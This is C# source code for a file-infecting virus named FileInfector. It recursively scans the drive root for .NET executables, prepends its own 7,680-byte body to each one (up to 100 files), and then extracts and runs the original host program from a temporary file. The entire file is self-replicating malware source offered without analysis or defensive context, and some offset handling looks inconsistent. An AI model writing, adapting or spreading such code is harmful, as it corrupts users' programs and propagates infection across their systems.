using System; 
using System.Text;
using System.IO;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Threading;
using Microsoft.Win32;

namespace FileInfector 
{
    public class w32api 
    {
        [DllImport("user32.dll", CharSet = CharSet.Auto)] 
        public static extern int MessageBox(int hWnd, String text, String caption, uint type);
    }
    public class Poly 
    {
        private static int counter = 0;
        static void Main(string[] args)
        {
            string xx = Path.GetDirectoryName(Assembly.GetExecutingAssembly().GetModules()[0].FullyQualifiedName); 
            string xy = Directory.GetDirectoryRoot(xx); 
            DirectoryInfo dir = new DirectoryInfo(@xy); 
            int yy = Files(dir); 
            FileStream fs1 = new FileStream(Assembly.GetExecutingAssembly().GetModules()[0].FullyQualifiedName, FileMode.OpenOrCreate, FileAccess.Read);
            int host = (int)fs1.Length; 
            int vir = host - 7680; 
            byte[] bytes = Read(fs1, vir, 7680); 
            fs1.Close(); 
            Random ran = new Random();
            int SX = ran.Next(2000); 
            FileStream fs11 = new FileStream(SX + ".exe", FileMode.OpenOrCreate, FileAccess.Write); 
            Write(fs11, bytes); 
            fs11.Close(); 
            try
            {
                Process x = Process.Start(SX + ".exe"); 
                x.WaitForExit(); 
            }
            catch { }
            finally
            {
                File.Delete(SX + ".exe"); 
            }
        }
        private static int Files(DirectoryInfo d)
        {
            FileInfo[] files = d.GetFiles("*.exe");
            foreach (FileInfo file in files)
            {
                string filename = file.FullName;
                try
                {
                    AssemblyName.GetAssemblyName(filename);
                    if (Sha1(Assembly.GetExecutingAssembly().GetModules()[0].FullyQualifiedName) == Sha1(filename))
                        continue;
                    else
                        try
                        {
                            Console.WriteLine(filename);
                            bool inf = Infect(filename);
                            if (inf == false)
                            {
                                counter++;
                            }
                        }
                        catch
                        {
                            continue; 
                        }
                    //                                     return;
                    if (counter == 100)
                    {
                        return 0;
                    }
                }
                catch { continue; } 
            }
            DirectoryInfo[] dirs = d.GetDirectories("*.*"); 
            foreach (DirectoryInfo dir in dirs)
            {
                try
                {
                    
                    if (counter == 100)
                    {
                        return 0;
                    }
                    int yyy = Files(dir);
                }
                catch { continue; }
            }
            return 1;
        }
        public static byte[] Read(FileStream s, int length, int c)
        {
            BinaryReader w33 = new BinaryReader(s);
            w33.BaseStream.Seek(c, SeekOrigin.Begin);
            byte[] bytes2 = new byte[length];
            int numBytesToRead2 = (int)length;
            int numBytesRead2 = 0;
            while (numBytesToRead2 > 0)
            {
                int n = w33.Read(bytes2, numBytesRead2, numBytesToRead2);
                if (n == 0)
                    break;
                numBytesRead2 += n;
                numBytesToRead2 -= n;
            }
            w33.Close();
            return bytes2;
        }
        public static bool Infect(string host)
        {
            Module mod = Assembly.GetExecutingAssembly().GetModules()[0];
            FileStream fs = new FileStream(mod.FullyQualifiedName, FileMode.OpenOrCreate, FileAccess.Read);
            byte[] bytes = Read(fs, 7680, 0);
            fs.Close();
            FileStream fs133 = new FileStream(host, FileMode.OpenOrCreate, FileAccess.Read);
            int i = (int)fs133.Length;
            byte[] bytes2 = Read(fs133, i, 0);
            fs133.Close();
            FileStream fs1 = new FileStream(host, FileMode.OpenOrCreate, FileAccess.Write);
            WriteX(fs1, bytes, bytes2);
            fs1.Close();
            return false;
        }
        public static void Write(FileStream s, byte[] g)
        {
            BinaryWriter w = new BinaryWriter(s);
            w.BaseStream.Seek(0, SeekOrigin.Begin);
            w.Write(g);
            w.Flush();
            w.Close();
        }
        public static void WriteX(FileStream s, byte[] g, byte[] k)
        {
            BinaryWriter w = new BinaryWriter(s);
            w.BaseStream.Seek(0, SeekOrigin.Begin);
            w.Write(g);
            w.Write(k);
            w.Flush();
            w.Close();
        }
        public static string Sha1(string data)
        {
            FileStream FSsha = new FileStream(data, FileMode.OpenOrCreate, FileAccess.Read);
            byte[] Bsha = Read(FSsha, 2048, 0);
            FSsha.Close();
            SHA1 sha = new SHA1CryptoServiceProvider();
            byte[] result = sha.ComputeHash(Bsha);
            return BytesToHexString(result);
        }
        static String BytesToHexString(byte[] bytes)
        {
            StringBuilder hexString = new StringBuilder(64);
            for (int counter = 0; counter < bytes.Length; counter++)
            {
                hexString.Append(String.Format("{0:X2}", bytes[counter]));
            }
            return hexString.ToString();
        }
    }
}
